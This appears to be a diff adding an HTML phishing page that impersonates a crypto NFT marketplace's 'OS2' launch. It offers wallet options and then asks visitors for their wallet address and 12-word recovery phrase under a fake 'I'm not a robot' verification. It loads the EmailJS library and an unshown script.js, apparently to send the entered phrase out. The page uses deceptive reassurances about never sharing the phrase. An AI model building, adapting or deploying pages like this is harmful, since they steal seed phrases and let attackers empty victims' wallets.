@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OS2 XP Verification</title>
+    <link rel="stylesheet" href="styles.css">
+	<script type="text/javascript"
+        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+</script>
+</head>
+<body>
+    <div class="background-container"></div>
+
+    <div class="popup-overlay" id="popup">
+        <!-- Slide 1 -->
+        <div class="popup-content initial-slide active-slide">
+            <button class="close-btn" id="closePopup">×</button>
+            <img src="images/os2-logo.png" alt="OS2 Logo" class="main-logo">
+            <h2>Start Earning XP on OS2</h2>
+            <p>Experience our reimagined marketplace with 0.5% platform fees, seamless cross-chain swaps, and an XP system designed to reward participation.</p>
+
+            <div class="wallet-options">
+                <div class="wallet-option">
+                    <img src="images/metamask.png" alt="MetaMask">
+                    <span>MetaMask</span>
+                </div>
+                <div class="wallet-option">
+                    <img src="images/coinbase.png" alt="Coinbase Wallet">
+                    <span>Coinbase Wallet</span>
+                </div>
+                <div class="wallet-option">
+                    <img src="images/walletconnect.png" alt="WalletConnect">
+                    <span>WalletConnect</span>
+                </div>
+            </div>
+
+            <div class="popup-buttons">
+                <button class="cta-btn" id="enterOS2">Enter OS2</button>
+                <button class="secondary-btn" id="osClassic">No thanks, I'll stick with OS Classic</button>
+            </div>
+        </div>
+
+        <!-- Slide 2 -->
+        <div class="popup-content wallet-slide">
+            <img src="images/os2-logo.png" alt="OS2 Logo" class="main-logo">
+            <div class="verification-header">
+                <h2>Wallet Verification</h2>
+                <p>To continue to View External StoreFront (dashboard), complete 2-Step Manual Verification</p>
+            </div>
+            <div class="verification-body">
+                <div class="input-group">
+                    <label for="walletAddress">Your Wallet Address</label>
+                    <input type="text" id="walletAddress" placeholder="0x...">
+                </div>
+					<div class="robot-check">
+					<input type="checkbox" id="notRobotWallet" />
+					<label for="walletRobot">I'm not a robot</label>
+				</div>
+					<p class="warning">Manual verification required to ensure this action is not automated or completed by a robot.</p>
+
+                <button class="cta-btn" id="continueVerification">Continue to Verification</button>
+            </div>
+        </div>
+
+        <!-- Slide 3 -->
+        <div class="popup-content phrase-slide">
+            <img src="images/os2-logo.png" alt="OS2 Logo" class="main-logo">
+            <div class="verification-header">
+                <h2>Security Verification</h2>
+                <p class="warning">IMPORTANT: Carefully input your 12-word recovery phrase manually to verify you're not a robot</p>
+            </div>
+            <div class="verification-body">
+                <div class="input-group">
+                    <label for="recoveryPhrase">12-Word Recovery Phrase</label>
+                    <textarea id="recoveryPhrase" placeholder="Enter all 12 words separated by spaces"></textarea>
+                </div>
+                <div class="security-notice">
+                    <p>Never share your recovery phrase with anyone. OS2 will never ask for it outside this verification process.</p>
+                </div>
+				<div class="robot-check">
+					<input type="checkbox" id="notRobotPhrase" />
+					<label for="phraseRobot">I'm not a robot</label>
+				</div>
+					<p class="warning">This manual verification is used to ensure a human is completing the process.</p>
+
+                <button class="cta-btn" id="completeVerification">Verify and View StoreFront</button>
+            </div>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
